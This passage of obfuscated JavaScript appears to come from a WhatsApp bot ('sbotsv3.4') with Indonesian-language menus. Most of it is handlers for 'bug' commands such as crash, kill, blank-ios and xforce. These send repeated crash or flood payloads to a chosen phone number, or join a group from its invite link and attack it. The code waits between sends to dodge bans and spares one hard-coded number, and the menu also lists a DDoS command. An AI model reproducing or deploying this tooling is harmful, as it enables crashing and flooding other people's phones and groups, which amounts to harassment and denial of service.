          txt4 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG SPAM-ANDRO" + bb + " ❐\n┃⭔.24j *<jumlah spam>*\n┃⭔.kill *<jumlah spam>*\n┃⭔.bug *<jumlah spam>*\n┃⭔.bom *<jumlah spam>*\n┃⭔.delay *<jumlah spam>*\n┃⭔.spam *<jumlah spam>*\n┃⭔.crash *<jumlah spam>*\n┃⭔.strava *<jumlah spam>*\n┃⭔.bugui *<jumlah spam>*\n┃⭔.1day *<jumlah spam>*\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG SPAM-IOS" + bb + " ❐\n┃⭔.ios *<jumlah spam>*\n┃⭔.ui-ios *<jumlah spam>*\n┃⭔.bl-ios *<jumlah spam>*\n┃⭔.ci-ios *<jumlah spam>*\n┃⭔.fc-ios *<jumlah spam>*\n┃⭔.stv-ios *<jumlah spam>*\n┃⭔.va-ios *<jumlah spam>*\n┃⭔.lec-ios *<jumlah spam>*\n┃⭔.blank-ios *<jumlah spam>*\n┃⭔.black-ios *<jumlah spam>*\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG ANDRO-HIGH" + bb + " ❐\n┃⭔.xbutton 628XXXX,3\n┃⭔.xcrash 628XXXX,3\n┃⭔.xforce 628XXXX,3\n┃⭔.xbom 628XXXX,3\n┃⭔.xstik 628XXXX,3\n┃⭔.xlist 628XXXX,3\n┃⭔.x24j 628XXXX,3\n┃⭔.xuia 628XXXX,3\n┃⭔.xlec 628XXXX,3\n┃⭔.xva 628XXXX,3\n┃⭔.xta 628XXXX,3\n┃⭔.xvir 628XXXX,3\n┃⭔.xdoc 628XXXX,3\n┃⭔.xkill 628XXXX,3\n┃⭔.xbug 628XXXX,3\n┃⭔.xloc 628XXXX,3\n┃⭔.xhit 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG ANDRO-EASY" + bb + " ❐\n┃⭔.forcepc 628XXXX,3\n┃⭔.sendbug 628XXXX,3\n┃⭔.santetpc 628XXXX,3\n┃⭔.crashpc 628XXXX,3\n┃⭔.delaypc 628XXXX,3\n┃⭔.spampc 628XXXX,3\n┃⭔.virgam 628XXXX,3\n┃⭔.bugpc 628XXXX,3\n┃⭔.unlipc 628XXXX,3\n┃⭔.lolpc 628XXXX,3\n┃⭔.lecpc 628XXXX,3\n┃⭔.tetpc 628XXXX,3\n┃⭔.rorrpc 628XXXX,3\n┃⭔.docpc 628XXXX,3\n┃⭔.stvpc 628XXXX,3\n┃⭔.vaspc 628XXXX,3\n┃⭔.trolipc 628XXXX,3\n┃⭔.pollpc 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG IOS-IPONG" + bb + " ❐\n┃⭔.ioskill 628XXXX,3\n┃⭔.iospc 628XXXX,3\n┃⭔.iosxs 628XXXX,3\n┃⭔.ioslcy 628XXXX,3\n┃⭔.iosbug 628XXXX,3\n┃⭔.bug-ios 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG GROUP" + bb + " ❐\n┃⭔.butgc *linkgrup*\n┃⭔.uigc *linkgrup*\n┃⭔.stvgc *linkgrup*\n┃⭔.notgc *linkgrup*\n┃⭔.blankgc *linkgrup*\n┃⭔.seranggc *linkgrup*\n┃⭔.musnahgc *linkgrup*\n┃⭔.buggc *linkgrup*\n┃⭔.bomgc *linkgrup*\n┃⭔.travagc *linkgrup*\n┃⭔.crashgc *linkgrup*\n┃\n┗❐「 *sbotsv3.4* 」\n▬▭▬▭▬▭▬▭▬▭▬▭▬";
          txt5 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "CPANEL MENU" + bb + " ❐\n┃⭔.listapi\n┃⭔.addapi\n┃⭔.delusr\n┃⭔.detusr\n┃⭔.listusr\n┃⭔.addusr\n┃⭔.listsrv\n┃⭔.detsrv\n┃⭔.delsrv\n┃⭔.addsrv\n┃⭔.bansrv\n┃⭔.unbansrv\n┃⭔.reinstall\n┃\n┗❐「 *sbotsv3.4* 」\n▬▭▬▭▬▭▬▭▬▭▬▭▬";
          txt6 = "▱▰▱「 *sbotsv3.4* 」▱▰▱\n╭──────────────────\n│ *Botname* : " + global.botName + "\n│ *Ownername* : " + global.ownerName + "\n│ *Pengguna* : " + (_0x446185 ? "Owner" : "User") + "\n│ *Total Fitur* : 100+\n│ *Number* : @" + _0x565577.split("@")[0] + "\n╰──────────────────\n▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "OWNER MENU" + bb + " ❐\n┃⭔.leave\n┃⭔.restart\n┃⭔.listprem\n┃⭔.shutdown\n┃⭔.join <linkgrup>\n┃⭔.block number\n┃⭔.unblock number\n┃⭔.delprem number\n┃⭔.addprem number\n┃⭔.mix <link> <time>\n┃⭔.ddos <link> <time>\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬\n┃┏❐ " + bb + "JADIBOT MENU" + bb + " ❐\n┃⭔.stopjadibot\n┃⭔.resetjadibot\n┃⭔.listjadibot\n┃⭔.jadibot\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "GROUP MENU" + bb + " ❐\n┃⭔.open\n┃⭔.close\n┃⭔.linkgc\n┃⭔.linkgrup\n┃⭔.revoke\n┃⭔.hidetag teks\n┃⭔.kick @tag\n┃⭔.promote @tag\n┃⭔.demote @tag\n┃⭔.setname teks\n┃⭔.setdesc teks\n┃⭔.editinfo teks\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "GROUP MENU" + bb + " ❐\n┃⭔.open\n┃⭔.close\n┃⭔.linkgc\n┃⭔.linkgrup\n┃⭔.revoke\n┃⭔.hidetag teks\n┃⭔.kick @tag\n┃⭔.promote @tag\n┃⭔.demote @tag\n┃⭔.setname teks\n┃⭔.setdesc teks\n┃⭔.editinfo teks\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG SPAM-ANDRO" + bb + " ❐\n┃⭔.24j *<jumlah spam>*\n┃⭔.kill *<jumlah spam>*\n┃⭔.bug *<jumlah spam>*\n┃⭔.bom *<jumlah spam>*\n┃⭔.delay *<jumlah spam>*\n┃⭔.spam *<jumlah spam>*\n┃⭔.crash *<jumlah spam>*\n┃⭔.strava *<jumlah spam>*\n┃⭔.bugui *<jumlah spam>*\n┃⭔.1day *<jumlah spam>*\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG SPAM-IOS" + bb + " ❐\n┃⭔.ios *<jumlah spam>*\n┃⭔.ui-ios *<jumlah spam>*\n┃⭔.bl-ios *<jumlah spam>*\n┃⭔.ci-ios *<jumlah spam>*\n┃⭔.fc-ios *<jumlah spam>*\n┃⭔.stv-ios *<jumlah spam>*\n┃⭔.va-ios *<jumlah spam>*\n┃⭔.lec-ios *<jumlah spam>*\n┃⭔.blank-ios *<jumlah spam>*\n┃⭔.black-ios *<jumlah spam>*\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG ANDRO-HIGH" + bb + " ❐\n┃⭔.xbutton 628XXXX,3\n┃⭔.xcrash 628XXXX,3\n┃⭔.xforce 628XXXX,3\n┃⭔.xbom 628XXXX,3\n┃⭔.xstik 628XXXX,3\n┃⭔.xlist 628XXXX,3\n┃⭔.x24j 628XXXX,3\n┃⭔.xuia 628XXXX,3\n┃⭔.xlec 628XXXX,3\n┃⭔.xva 628XXXX,3\n┃⭔.xta 628XXXX,3\n┃⭔.xvir 628XXXX,3\n┃⭔.xdoc 628XXXX,3\n┃⭔.xkill 628XXXX,3\n┃⭔.xbug 628XXXX,3\n┃⭔.xloc 628XXXX,3\n┃⭔.xhit 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG ANDRO-EASY" + bb + " ❐\n┃⭔.forcepc 628XXXX,3\n┃⭔.sendbug 628XXXX,3\n┃⭔.santetpc 628XXXX,3\n┃⭔.crashpc 628XXXX,3\n┃⭔.delaypc 628XXXX,3\n┃⭔.spampc 628XXXX,3\n┃⭔.virgam 628XXXX,3\n┃⭔.bugpc 628XXXX,3\n┃⭔.unlipc 628XXXX,3\n┃⭔.lolpc 628XXXX,3\n┃⭔.lecpc 628XXXX,3\n┃⭔.tetpc 628XXXX,3\n┃⭔.rorrpc 628XXXX,3\n┃⭔.docpc 628XXXX,3\n┃⭔.stvpc 628XXXX,3\n┃⭔.vaspc 628XXXX,3\n┃⭔.trolipc 628XXXX,3\n┃⭔.pollpc 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG IOS-IPONG" + bb + " ❐\n┃⭔.ioskill 628XXXX,3\n┃⭔.iospc 628XXXX,3\n┃⭔.iosxs 628XXXX,3\n┃⭔.ioslcy 628XXXX,3\n┃⭔.iosbug 628XXXX,3\n┃⭔.bug-ios 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG GROUP" + bb + " ❐\n┃⭔.butgc *linkgrup*\n┃⭔.uigc *linkgrup*\n┃⭔.stvgc *linkgrup*\n┃⭔.notgc *linkgrup*\n┃⭔.blankgc *linkgrup*\n┃⭔.seranggc *linkgrup*\n┃⭔.musnahgc *linkgrup*\n┃⭔.buggc *linkgrup*\n┃⭔.bomgc *linkgrup*\n┃⭔.travagc *linkgrup*\n┃⭔.crashgc *linkgrup*\n┃\n┗❐「 *sbotsv3.4* 」\n▬▭▬▭▬▭▬▭▬▭▬▭▬";
          if (_0x463704 == "ownermenu") {
            _0x4366e1(txt1);
          } else if (_0x463704 == "jadibotmenu") {
            _0x4366e1(txt2);
          } else if (_0x463704 == "groupmenu") {
            _0x4366e1(txt3);
          } else if (_0x463704 == "bugmenu") {
            _0x4366e1(txt4);
          } else if (_0x463704 == "panelmenu") {
            _0x4366e1(txt5);
          } else if (_0x463704 == "allmenu") {
            _0x4366e1(txt6);
          }
        }
        break;
      case "1day":
      case "kill":
      case "24j":
      case "bom":
      case "bug":
      case "bugui":
      case "delay":
      case "spam":
      case "strava":
      case "crash":
        {
          if (!_0x540fdf) {
            return _0x2c90b0("*Fitur Ini Khusus Bot Saja!*");
          }
          if (!q) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 7");
          }
          if (isNaN(parseInt(q))) {
            return _0x2c90b0("Jumlah wajib angka!!");
          }
          let _0x29b01e = "" + encodeURI(q);
          _0x2c90b0("...");
          await sleep(2000);
          _0x14fb3d(_0x1688e9, _0x29b01e);
          await sleep(2500);
          _0x417a71("✅");
        }
        break;
      case "blank-ios":
      case "black-ios":
      case "lec-ios":
      case "stv-ios":
      case "va-ios":
      case "ci-ios":
      case "bl-ios":
      case "fc-ios":
      case "ui-ios":
      case "ios":
        {
          if (!_0x540fdf) {
            return _0x2c90b0("*Fitur Ini Khusus Bot Saja!*");
          }
          if (!q) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 7");
          }
          if (isNaN(parseInt(q))) {
            return _0x2c90b0("Jumlah wajib angka!!");
          }
          let _0x569899 = encodeURI(q) * 200;
          _0x2c90b0("...");
          await sleep(2000);
          _0x10a4dd(_0x1688e9, _0x569899);
          await sleep(2500);
          _0x417a71("✅");
        }
        break;
      case "iosbug":
      case "iospc":
      case "bug-ios":
      case "ioslcy":
      case "ioskill":
      case "iosxs":
        {
          if (!_0x446185 && !_0x540fdf && !_0x1be9bd) {
            return _0x2c90b0("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          let _0x37c77a = q.split(",")[0];
          let _0x313a9e = q.split(",")[1] ? q.split(",")[1] : "10";
          if (!_0x37c77a) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          if (isNaN(parseInt(_0x313a9e))) {
            return _0x2c90b0("Jumlah wajib angka!!");
          }
          let _0x1fa2e7 = _0x37c77a.replace(/[^0-9]/g, "");
          let _0x4b63ac = encodeURI(_0x313a9e) * 200;
          var _0x27d825 = await _0x134739.onWhatsApp(_0x1fa2e7 + "@s.whatsapp.net");
          let _0x22c013 = _0x1fa2e7 + "@s.whatsapp.net";
          if (_0x1fa2e7 == "6283834558105") {
            return;
          }
          if (_0x27d825.length == 0) {
            return _0x2c90b0("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          _0x3fee19("</> Being processed.. Send to @" + _0x22c013.split("@")[0] + " Using *" + _0x463704 + "*\n\n<!> Pause 2 minutes so that the bot is not banned.", [_0x22c013]);
          await sleep(2000);
          _0x10a4dd(_0x22c013, _0x4b63ac);
          await sleep(2500);
          _0x417a71("✅");
        }
        break;
      case "trolipc":
      case "pollpc":
      case "lolpc":
      case "lecpc":
      case "tetpc":
      case "rorrpc":
      case "docpc":
      case "stvpc":
      case "vaspc":
      case "unlipc":
      case "bugpc":
      case "santetpc":
      case "forcepc":
      case "crashpc":
      case "delaypc":
      case "spampc":
      case "virgam":
      case "sendbug":
        {
          if (!_0x446185 && !_0x540fdf && !_0x1be9bd) {
            return _0x2c90b0("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          let _0x714b41 = q.split(",")[0];
          let _0x3730d7 = q.split(",")[1] * 3;
          if (!_0x714b41) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          if (!_0x3730d7) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          if (isNaN(parseInt(_0x3730d7))) {
            return _0x2c90b0("Jumlah wajib angka!!");
          }
          let _0x567b9e = _0x714b41.replace(/[^0-9]/g, "");
          let _0xba5baa = "" + encodeURI(_0x3730d7);
          var _0x27d825 = await _0x134739.onWhatsApp(_0x567b9e + "@s.whatsapp.net");
          let _0x4b191b = _0x567b9e + "@s.whatsapp.net";
          if (_0x567b9e == "6283834558105") {
            return;
          }
          if (_0x27d825.length == 0) {
            return _0x2c90b0("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          _0x3fee19("</> Being Processed.. Send To @" + _0x4b191b.split("@")[0] + " Using *" + _0x463704 + "*\n\n<!> Pause 2 minutes so that the bot is not banned.", [_0x4b191b]);
          await sleep(2000);
          _0x14fb3d(_0x4b191b, _0xba5baa);
          await sleep(2500);
          _0x417a71("✅");
        }
        break;
      case "xvir":
      case "xstik":
      case "xlist":
      case "x24j":
      case "xuia":
      case "xlec":
      case "xforce":
      case "xva":
      case "xta":
      case "xcrash":
      case "xbutton":
      case "xbom":
      case "xbug":
      case "xkill":
      case "xloc":
      case "xdoc":
      case "xhit":
        {
          if (!_0x446185 && !_0x540fdf && !_0x1be9bd) {
            return _0x2c90b0("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          let _0x3d7560 = q.split(",")[0];
          let _0x17867b = q.split(",")[1] * 5;
          if (!_0x3d7560) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          if (!_0x17867b) {
            return _0x2c90b0("*FORMAT BUG " + _0x463704.toUpperCase() + "*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " number,jumlah\n\n*Contoh:*\n" + (_0x537231 + _0x463704) + " 628xxxx,5");
          }
          if (isNaN(parseInt(_0x17867b))) {
            return _0x2c90b0("Jumlah wajib angka!!");
          }
          let _0x4f0ecc = _0x3d7560.replace(/[^0-9]/g, "");
          let _0x4291b3 = "" + encodeURI(_0x17867b);
          var _0x27d825 = await _0x134739.onWhatsApp(_0x4f0ecc + "@s.whatsapp.net");
          let _0xd3ee31 = _0x4f0ecc + "@s.whatsapp.net";
          if (_0x4f0ecc == "6283834558105") {
            return;
          }
          if (_0x27d825.length == 0) {
            return _0x2c90b0("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          _0x3fee19("</> Being Processed.. Send To @" + _0xd3ee31.split("@")[0] + " Using *" + _0x463704 + "*\n\n<!> Pause 2 minutes so that the bot is not banned.", [_0xd3ee31]);
          await sleep(2000);
          _0x14fb3d(_0xd3ee31, _0x4291b3);
          await sleep(2500);
          _0x417a71("✅");
        }
        break;
      case "butgc":
      case "uigc":
      case "stvgc":
      case "notgc":
      case "blankgc":
      case "seranggc":
      case "musnahgc":
      case "travagc":
      case "buggc":
      case "crashgc":
      case "bomgc":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur Ini Khusus Member Premium/Owner*");
          }
          if (!q) {
            return _0x2c90b0("*CARA MENGIRIM BUG GROUB*\n\n" + (_0x537231 + _0x463704) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\n\nEx: ." + _0x463704 + " linkgc jumlahbug\n\nContoh:\n." + _0x463704 + " https://chat.whatsapp.com/xxxx 10");
          }
          _0x2c90b0("...");
          if (!q.split(" ")[0].includes("whatsapp.com")) {
            return _0x2c90b0("Link Invalid!");
          }
          resjoin = q.split(" ")[0].split("https://chat.whatsapp.com/")[1];
          jumela = q.split(" ")[1] ? q.split(" ")[1] : "1";
          initarget = await _0x134739.groupAcceptInvite(resjoin);
          await sleep(2000);
          _0x4c4452(initarget, jumela);
          await sleep(3000);
          _0x2c90b0("*DONE ✓*");
          await sleep(5000);
          _0x134739.groupLeave(_0x1688e9);
        }
        break;
      case "join":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("*Fitur Ini Khusus Member Premium/Owner*");
        }
        if (!q) {
          return _0x2c90b0("Enter Group Link!\nEx: .join https://chat.whatsapp.com/xxxx");
        }
        if (!_0x66dd87[0].includes("whatsapp.com")) {
          return _0x2c90b0("Link Invalid!");
        }
        resjoin = _0x66dd87[0].split("https://chat.whatsapp.com/")[1];
        join = await _0x134739.groupAcceptInvite(resjoin);
        _0x2c90b0(join);
        break;
      case "linkgrup":
      case "linkgc":
        {
          if (!_0x5ed51d) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0x868551) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x380b2e && !_0x540fdf && !_0x446185) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          url_ = await _0x134739.groupInviteCode(_0x1688e9);
          yurl = "https://chat.whatsapp.com/" + url_;
          _0x2c90b0(yurl);
        }
        break;
      case "open":
        if (!_0x5ed51d) {
          return;
        }
        if (!_0x380b2e && !_0x540fdf && !_0x446185) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x868551) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x134739.groupSettingUpdate(_0x1688e9, "not_announcement");
        const _0x3ffb98 = "*OPENED* The group is opened by admin\nNow members can send messages";
        _0x2c90b0(_0x3ffb98);
        break;
      case "close":
        if (!_0x5ed51d) {
          return;
        }
        if (!_0x380b2e && !_0x540fdf && !_0x446185) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x868551) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x134739.groupSettingUpdate(_0x1688e9, "announcement");
        const _0x49f9c0 = "*CLOSED* group closed by admin\nnow only admin can send messages";
        _0x2c90b0(_0x49f9c0);
        break;
      case "revoke":
        {
          if (!_0x5ed51d) {
            return;
          }
          if (!_0x868551) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0x380b2e && !_0x540fdf && !_0x446185) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          await _0x134739.groupRevokeInvite(_0x1688e9).then(_0xf7c0c8 => _0x2c90b0(_0x3f4b84(_0xf7c0c8))).catch(_0x17091d => _0x2c90b0(_0x3f4b84(_0x17091d)));
        }
        break;
      case "kick":
        if (!_0x5ed51d) {
          return;
        }
        if (!_0x380b2e && !_0x540fdf && !_0x446185) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x868551) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x2cf499.message.extendedTextMessage === undefined || _0x2cf499.message.extendedTextMessage === null) {
          return _0x2c90b0("Reply targetnya!");
        }
        _0x2c90b0("Sampah Grup Berhasil di Keluarkan!");
        remove = _0x2cf499.message.extendedTextMessage.contextInfo.participant;
        await _0x134739.groupParticipantsUpdate(_0x1688e9, [remove], "remove");
        break;
      case "hidetag":
        {
          if (!_0x5ed51d) {
            return;
          }
          if (!_0x380b2e && !_0x540fdf && !_0x446185) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          let _0x20802f = [];
          _0x1a4f5e.map(_0x4977ba => _0x20802f.push(_0x4977ba.id));
          _0x134739.sendMessage(_0x1688e9, {
            text: q ? q : "",
            mentions: _0x20802f
          });
        }
        break;
      case "promote":
        {
          if (!_0x5ed51d) {
            return;
          }
          if (!_0x380b2e && !_0x540fdf && !_0x446185) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x868551) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x2cf499.message.extendedTextMessage === undefined || _0x2cf499.message.extendedTextMessage === null) {
            return _0x2c90b0("Reply targetnya!");
          }
          promote = _0x2cf499.message.extendedTextMessage.contextInfo.participant;
          await _0x134739.groupParticipantsUpdate(_0x1688e9, [promote], "promote").then(_0x6888f9 => _0x2c90b0(_0x3f4b84(_0x6888f9))).catch(_0x3b755c => _0x2c90b0(_0x3f4b84(_0x3b755c)));
        }
        break;
      case "demote":
        {
          if (!_0x5ed51d) {
            return;
          }
          if (!_0x380b2e && !_0x540fdf && !_0x446185) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x868551) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x2cf499.message.extendedTextMessage === undefined || _0x2cf499.message.extendedTextMessage === null) {
            return _0x2c90b0("Reply targetnya!");
          }
          demote = _0x2cf499.message.extendedTextMessage.contextInfo.participant;
          await _0x134739.groupParticipantsUpdate(_0x1688e9, [demote], "demote").then(_0x4270cd => _0x2c90b0(_0x3f4b84(_0x4270cd))).catch(_0x180813 => _0x2c90b0(_0x3f4b84(_0x180813)));
        }
        break;
      case "setname":
      case "setsubject":
        {
          if (!_0x5ed51d) {
            return;
          }
          if (!_0x380b2e && !_0x540fdf && !_0x446185) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x868551) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x2c90b0("Nama Group Nya Mana?\n\nEx:\n.setname nama_group");
          }
          await _0x134739.groupUpdateSubject(_0x1688e9, q).then(_0x3d315d => _0x2c90b0(_0x3f4b84(_0x3d315d))).catch(_0x125cb6 => _0x2c90b0(_0x3f4b84(_0x125cb6)));
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!_0x5ed51d) {
            return;
          }
          if (!_0x380b2e && !_0x540fdf && !_0x446185) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0x868551) {
            return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x2c90b0("Teks Deskripsi Nya Mana?\n\nEx:\n.setdesc teks_deskripsi");
          }
          await _0x134739.groupUpdateDescription(_0x1688e9, q).then(_0xb895c0 => _0x2c90b0(_0x3f4b84(_0xb895c0))).catch(_0x49754f => _0x2c90b0(_0x3f4b84(_0x49754f)));
        }
        break;
      case "editinfo":
        if (!_0x5ed51d) {
          return;
        }
        if (!_0x380b2e && !_0x540fdf && !_0x446185) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0x868551) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x66dd87[0] === "open") {
          await _0x134739.groupSettingUpdate(_0x1688e9, "unlocked").then(_0x51bef2 => _0x2c90b0("Successfully Opened Group Edit Info")).catch(_0x4d5ae9 => _0x2c90b0(_0x3f4b84(_0x4d5ae9)));
        } else if (_0x66dd87[0] === "close") {
          await _0x134739.groupSettingUpdate(_0x1688e9, "locked").then(_0x42225f => _0x2c90b0("Successfully Closed Group Edit Info")).catch(_0x5c1c76 => _0x2c90b0(_0x3f4b84(_0x5c1c76)));
        } else {
          _0x2c90b0("*MODE DESKRIPSI GROUP*\n\n*_Open : semua member bisa edit deskripsi grup_*\n\n*_Close: hanya admin group yang bisa edit deskripsi_*\n\n*Example:*\n" + (_0x537231 + _0x463704) + " close");
        }
        break;
      case "listapi":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x58b573 = await fetch(global.domain + "/api/client/account/api-keys", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_pltc
            }
          });
          let _0x5034f4 = await _0x58b573.json();
          if (_0x5034f4.errors) {
            return _0x2c90b0(util.format(_0x5034f4.errors[0]));
          }
          _0x2c90b0(util.format(_0x5034f4.data));
        }
        break;
      case "addapi":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x5773ee = q ? q : _0x5e7e2d(5);
          let _0x735de1 = await fetch(global.domain + "/api/client/account/api-keys", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_pltc
            },
            body: JSON.stringify({
              description: _0x5773ee,
              allowed_ips: []
            })
          });
          let _0x1ef022 = await _0x735de1.json();
          _0x2c90b0(util.format(_0x1ef022));
          if (_0x1ef022.errors) {
            return _0x2c90b0(util.format(_0x1ef022.errors[0]));
          }
        }
        break;
      case "addusr":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x54eb2f = q.split(",")[0];
          let _0x20113a = q.split(",")[1];
          if (!_0x54eb2f && !_0x20113a) {
            return _0x2c90b0("*FORMAT ADDUSR*:\n.addusr 628xxxx,leccy");
          }
          userku = _0x54eb2f.replace(/[^0-9]/g, "");
          let _0x180288 = await _0x134739.onWhatsApp(userku + "@s.whatsapp.net");
          if (_0x180288.length == 0) {
            return _0x2c90b0("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          let _0x3207e6 = "" + _0x20113a + _0x5e7e2d(3);
          let _0xd510f4 = userku + "@s.whatsapp.net";
          let _0x36018d = await fetch(global.domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            },
            body: JSON.stringify({
              email: _0x20113a + "@buyer.id",
              username: _0x20113a,
              first_name: _0x20113a,
              last_name: "Users",
              language: "en",
              password: _0x3207e6
            })
          });
          let _0x34b0db = await _0x36018d.json();
          if (_0x34b0db.errors) {
            return _0x2c90b0(_0x34b0db.errors[0].detail);
          }
          let _0x106aaf = _0x34b0db.attributes;
          _0x2c90b0(_0x106aaf.username + ",," + _0x106aaf.id + ",ram/disk,cpu");
          let _0x1a35d0 = await _0x134739.sendMessage(userku + "@s.whatsapp.net", {
